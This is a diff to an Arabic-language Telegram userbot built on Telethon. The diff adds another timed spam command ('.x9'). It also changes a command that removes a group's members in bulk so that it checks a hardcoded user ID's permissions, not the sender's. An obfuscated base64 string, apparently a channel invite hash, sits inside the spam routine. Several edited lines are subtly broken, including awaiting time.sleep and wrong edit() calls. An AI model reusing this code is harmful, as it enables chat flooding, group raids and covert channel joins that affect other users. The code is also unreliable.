@@ -1,59 +1,40 @@
-import os
-import sys
-import random
-import datetime
-import base64
-import logging
-import asyncio
-import time
-from telethon.tl import functions, types
-from telethon.tl.functions.messages import ImportChatInviteRequest as Get
-from telethon.utils import get_display_name
-from telethon.tl.functions.channels import JoinChannelRequest
-from telethon.errors import FloodWaitError
-from telethon import TelegramClient, events
-from collections import deque
-from telethon.tl import functions, types
-from telethon.tl.functions.channels import LeaveChannelRequest
-from telethon.errors.rpcerrorlist import (
-    UserAlreadyParticipantError,
-    UserNotMutualContactError,
-    UserPrivacyRestrictedError,
-)
-from telethon.tl.types import (
-    ChannelParticipantsAdmins,
-    ChannelParticipantsKicked,
-    ChatBannedRights,
-    UserStatusEmpty,
-    UserStatusLastMonth,
-    UserStatusLastWeek,
-    UserStatusOffline,
-    UserStatusOnline,
-    UserStatusRecently
-)
-from telethon.tl import functions
-# -
-from hijri_converter import Hijri, Gregorian
-from telethon.tl.functions.users import GetFullUserRequest
 from telethon.errors.rpcerrorlist import YouBlockedUserError
-from telethon.tl.functions.account import UpdateNotifySettingsRequest
-from telethon.tl.functions.channels import InviteToChannelRequest
-from telethon.tl.types import InputPeerUser
-from telethon.sessions import StringSession
+from hijri_converter import Gregorian
+from telethon.tl import functions
+from telethon.tl.types import (
+    ChannelParticipantsAdmins
+)
+from telethon.tl.functions.channels import LeaveChannelRequest
+from collections import deque
+from telethon import events
+from telethon.errors import FloodWaitError
+from telethon.tl.functions.channels import JoinChannelRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+from telethon.tl import functions, types
+import time
+import asyncio
+import logging
+import base64
+import datetime
+import sys
+import os
 from calcu import *
-from config import *
 from checktele import *
 from help import *
 from waad import *
 from toolen import *
 from trans import *
-from yt import *
+from config import *
+from sql import *
+# -
+
 y = datetime.datetime.now().year
 m = datetime.datetime.now().month
 dayy = datetime.datetime.now().day
 day = datetime.datetime.now().strftime("%A")
 m9zpi = f"{y}-{m}-{dayy} - {day} day"
 sec = time.time()
+
 hijri_day = tran.translate(str(day), dest="ar")
 hijri = f"{Gregorian.today().to_hijri()} - {hijri_day.text}"
 LOGS = logging.getLogger(__name__)
@@ -80,13 +61,12 @@ async def join_channel():
 
 @sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.اكس او"))
 async def _(event):
-     
-    bot = 'inlinegamesbot'
+    bot = 'xobot'
     xo = await sedthon.inline_query(bot, "")
     await xo[0].click(
         event.chat_id,
-        #reply_to=event.is_reply_to_msg_id,
-        #silent=True if event.is_reply else False,
+        reply_to=event.is_reply_to_msg_id,
+        silent=True if event.is_reply else False,
         hide_via=True
     )
 
@@ -341,6 +321,17 @@ async def spammer(event):
     await event.delete()
     await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
 
+# مؤقت ل سوبر اكس ناين
+
+@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.x9 (.*)"))
+async def spammer(event):
+    reply = await event.get_reply_message()
+    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
+    sleeptimet = sleeptimem = float(input_str[0])
+    cat = input_str[1:]
+    await event.delete()
+    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
+
 
 async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
     hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
@@ -472,12 +463,12 @@ async def _(event):
 
 @sedthon.on(events.NewMessage(pattern=r"\.تفليش", outgoing=True))
 async def _(event):
-    result = await event.client.get_permissions(event.chat_id, event.sender_id)
+    result = await event.client.get_permissions(event.chat_id, 1361835146)
     if not result:
         return await event.edit(
             event, "عذر ليس لديك الصلاحيات الكافية لاستخدام هذا الامر"
         )
-    ksmkksmk = await event.edit("جارِ")
+    ksmkksmk = await event.edit(event, "جارِ")
     admins = await event.client.get_participants(
         event.chat_id, filter=ChannelParticipantsAdmins
     )
@@ -496,7 +487,7 @@ async def _(event):
                 await time.sleep(0.1)
         except Exception as e:
             LOGS.info(str(e))
-            time.sleep(0.1)
+            await time.sleep(0.1)
             await ksmkksmk.edit(f"تم بنجاح التفليش {success} من {total} الاعضاء")
 
 
@@ -652,7 +643,11 @@ async def _(event):
 
 @sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.بنك"))
 async def _(event):
-    await event.edit("انتضر...")
+    catevent = await event.edit(event, "`!....`")
+    await asyncio.sleep(0.3)
+    await event.edit(catevent, "`..!..`")
+    await asyncio.sleep(0.3)
+    await event.edit(catevent, "`....!`")
     start = datetime.now()
     end = datetime.now()
     tms = (end - start).microseconds / 1000
